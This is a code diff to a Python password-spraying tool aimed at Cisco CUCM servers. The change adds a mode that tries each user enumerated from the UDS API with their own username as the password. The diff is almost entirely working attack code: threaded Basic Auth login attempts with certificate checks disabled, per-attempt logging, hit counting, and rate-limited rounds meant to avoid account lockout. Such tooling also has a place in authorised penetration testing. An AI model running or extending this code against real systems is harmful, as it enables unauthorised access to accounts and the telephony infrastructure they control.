@@ -737,7 +737,7 @@ def _load_password_list(path):
         return [line.strip() for line in f if line.strip()]
 
 
-def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_flag, timeout=10):
+def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_flag, timeout=10, user_as_pass=False):
     """
     Thread target. Pops usernames off work_queue and attempts Basic Auth GET
     against /cucm-uds/user/{username}. Logs every attempt to spray_attempts.
@@ -751,11 +751,12 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
         except queue.Empty:
             return
 
+        effective_password = username if user_as_pass else password
         url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(username, safe="")}'
         status_code = None
         error = None
         try:
-            resp = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
+            resp = requests.get(url, auth=(username, effective_password), verify=False, timeout=timeout)
             status_code = resp.status_code
         except requests.exceptions.Timeout as e:
             error = f'timeout: {e}'
@@ -764,7 +765,7 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
         except Exception as e:
             error = f'{type(e).__name__}: {e}'
 
-        log_spray_attempt(cucm_host, username, password, status_code, error, db_file)
+        log_spray_attempt(cucm_host, username, effective_password, status_code, error, db_file)
 
         with results['lock']:
             if status_code == 200:
@@ -777,7 +778,7 @@ def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_
                 results['other'] += 1
 
 
-def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_file):
+def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_file, user_as_pass=False):
     """
     Top-level orchestrator for the UDS Basic-Auth password spray.
 
@@ -819,9 +820,10 @@ def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_f
     record_uds_users(cucm_host, users, db_file)
     print(f'[+] Loaded {len(users)} users from UDS API.')
 
-    # 3. Per-password rounds
-    total_rounds = len(passwords)
-    for round_index, password in enumerate(passwords, start=1):
+    # 3. Per-password rounds (user_as_pass runs as a single implicit round)
+    rounds = [(1, None)] if user_as_pass else list(enumerate(passwords, start=1))
+    total_rounds = len(rounds)
+    for round_index, password in rounds:
         # 3a. Build filtered work queue on the main thread (TOCTOU-safe).
         work = queue.Queue()
         skipped = 0
@@ -831,11 +833,12 @@ def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_f
             else:
                 work.put(username)
         eligible = work.qsize()
+        label = 'username-as-password' if user_as_pass else password
         print(f'[round {round_index}/{total_rounds}] eligible={eligible} skipped={skipped} '
               f'(rate-limited within last {rate_limit_hours}h)')
 
         if eligible == 0:
-            print(f'[round {round_index}/{total_rounds}] no eligible users; skipping password.')
+            print(f'[round {round_index}/{total_rounds}] no eligible users; skipping.')
         else:
             # 3b. Worker pool
             results = {'hits': 0, 'misses': 0, 'errors': 0, 'other': 0, 'lock': threading.Lock()}
@@ -845,6 +848,7 @@ def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_f
                 t = threading.Thread(
                     target=_spray_worker,
                     args=(work, results, password, cucm_host, port, db_file, dead_flag),
+                    kwargs={'user_as_pass': user_as_pass},
                     daemon=True,
                 )
                 t.start()
@@ -1721,6 +1725,8 @@ def main():
                         help='Single password to spray across all eligible users')
     parser.add_argument('-P', '--passwords', type=str, default=None, metavar='FILE',
                         help='Password list file; one password per line; rounds separated by ~1h sleep')
+    parser.add_argument('--spray-user-as-pass', action='store_true', default=False,
+                        help='Spray each user with their own username as the password')
     parser.add_argument('--spray-threads', type=int, default=10,
                         help='Concurrent spray workers (default: 10)')
     parser.add_argument('--spray-rate-limit-hours', type=int, default=1,
@@ -1927,10 +1933,15 @@ def main():
         if args.brute_mac:
             print('--spray and --brute-mac are mutually exclusive')
             quit(1)
-        if (args.spray_password is not None) == (args.passwords is not None):
-            # Both set, or neither set — both are errors.
-            print('--spray requires exactly one of --spray-password or -P/--passwords')
+        options_set = sum([
+            args.spray_password is not None,
+            args.passwords is not None,
+            args.spray_user_as_pass,
+        ])
+        if options_set != 1:
+            print('--spray requires exactly one of --spray-password, -P/--passwords, or --spray-user-as-pass')
             quit(1)
+        passwords = []
         if args.passwords:
             try:
                 passwords = _load_password_list(args.passwords)
@@ -1943,7 +1954,7 @@ def main():
             if not passwords:
                 print(f'[-] Password file is empty: {args.passwords}')
                 quit(1)
-        else:
+        elif args.spray_password is not None:
             passwords = [args.spray_password]
 
         run_spray(
@@ -1954,6 +1965,7 @@ def main():
             rate_limit_hours=args.spray_rate_limit_hours,
             probe=not args.no_spray_probe,
             db_file=db_file,
+            user_as_pass=args.spray_user_as_pass,
         )
         quit(0)
 
